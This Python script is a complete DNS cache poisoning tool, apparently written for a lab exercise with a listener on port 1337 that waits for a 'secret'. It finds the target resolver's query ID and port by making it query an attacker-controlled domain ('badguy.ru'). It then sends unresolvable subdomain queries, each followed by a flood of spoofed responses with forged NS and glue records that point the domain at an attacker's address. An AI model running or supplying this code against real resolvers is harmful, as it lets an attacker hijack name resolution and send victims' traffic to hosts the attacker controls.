import sys
import threading
from scapy.all import *
from dnslib import *


FOUND           = False

HOST_ADDR       = "badguy.ru"
DEF_ADDR        = "0.0.0.0"
SUFFIX          = "www12345678"

RANGE           = 50
TTL             = 3600
QUID_MAX        = 65536
DNS_HOS_PORT    = 55553
LISTENER_PORT   = 1337
DNS_DEF_PORT    = 53
BUFFER_SIZE     = 4096


def nameserver_info(domain, dns_addr):
    ''' this function sends a query to find the authoritatve nameserver
        that hosts the domain. it returns the name of the nameserver
        and its address.
    '''
    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, DNS_HOS_PORT))

    query = DNSRecord(q=DNSQuestion(domain,QTYPE.NS))
    sock.sendto(bytes(query.pack()),(dns_addr, DNS_DEF_PORT))
    data, addr = sock.recvfrom(BUFFER_SIZE)
    
    sock.close()

    ns = str(DNSRecord.parse(data).a.rname)
    ns_addr = str(DNSRecord.parse(data).a.rdata)

    return ns, ns_addr

def parser(dns_addr):
    ''' 
    this function sends a query with the domain hosted in the local machine
    to find the quid created by the victim dns and the destination port
    to use in the spoofed packets.
    '''

    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, DNS_HOS_PORT))

    query = DNSRecord(q=DNSQuestion(HOST_ADDR,QTYPE.A))

    sock.sendto(bytes(query.pack()),(dns_addr, DNS_DEF_PORT))
    data, addr = sock.recvfrom(BUFFER_SIZE)
    
    sock.close()

    return DNSRecord.parse(data).header.id, addr[1]

def create_question(domain, dns_addr):
    ''' 
    this function creates a question to send to the victim dns
    with a fake query i.e. a subdomain that cannot be resolved by the dns.
    '''
    fake_domain = SUFFIX + "." + domain 
    
    ip  = IP(dst=dns_addr)
    udp = UDP(dport=DNS_DEF_PORT)
    dns = DNS(rd=1, qd=DNSQR(qname=fake_domain))
        
    return bytes(ip / udp / dns)

def create_answers(quid, port, domain, au_ns, au_ns_addr, dns_addr, fake_addr):
    ''' 
    this function creates a set of spoofed answers to send to the victim dns.
    the quid is incremented in the cycle according to a global range.
    '''
    
    fake_domain = SUFFIX + "." + domain 
    packets = []

    start = quid + 1
    end = start + RANGE
    for i in range(start, end):

        ip  = IP(src=au_ns_addr, dst=dns_addr) 
        udp = UDP(sport=DNS_DEF_PORT, dport=port)
        dns = DNS(id=i % QUID_MAX, qr=1L,
                qd= DNSQR(qname=fake_domain),
                ns= DNSRR(rrname=domain, type='NS',rdata=au_ns, ttl=TTL),
                ar= DNSRR(rrname=au_ns, rdata=fake_addr, ttl=TTL)
        )

        res = (ip / udp / dns)
        packets.append(bytes(res))
    
    return packets

def listener(port):
    '''
    this function opens a socket on local machine on a given port
    an waits for a response i.e. the secret.
    '''

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((DEF_ADDR, port))
    
    data, addr = sock.recvfrom(BUFFER_SIZE)

    global FOUND
    FOUND = True

    sock.close()

    secret = str(data)
    
    print "*** SECRET FOUND"
    print '\n' + secret + '\n'

    with open("secret.txt", 'w') as f:
        f.write("secret:\n%s\n" % secret)


def poisoner(domain, au_ns, au_ns_addr, dns_addr, fake_addr):
    '''
        this is the core function. It opens a raw socket which it sends
        a query to the victim dns then a set of spoofed answers before the
        authoritative ns does it, trying to match the correct quid.
    '''

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    attempts = 1
    while not FOUND:
        print "*** ATTEMPT", attempts

        quid, port = parser(dns_addr)
        
        question = create_question(domain, dns_addr)
        answers = create_answers(quid, port, domain, au_ns, au_ns_addr, dns_addr, fake_addr)

        sock.sendto(question, (dns_addr, 0))
        for a in answers:
            sock.sendto(a, (dns_addr, 0))
        
        attempts += 1

    sock.close()


if __name__ == "__main__":

    if len(sys.argv) != 4:
        print "usage:", sys.argv[0], "<dns_addr> <domain> <fake_addr>"
        sys.exit(1)

    dns_addr = sys.argv[1]
    domain = sys.argv[2]
    fake_addr = sys.argv[3]        

    au_ns, au_ns_addr = nameserver_info(domain, dns_addr)

    listener_t = threading.Thread(target=listener, args=(LISTENER_PORT,))
    listener_t.start()

    poisoner(domain, au_ns, au_ns_addr, dns_addr, fake_addr)

    sys.exit()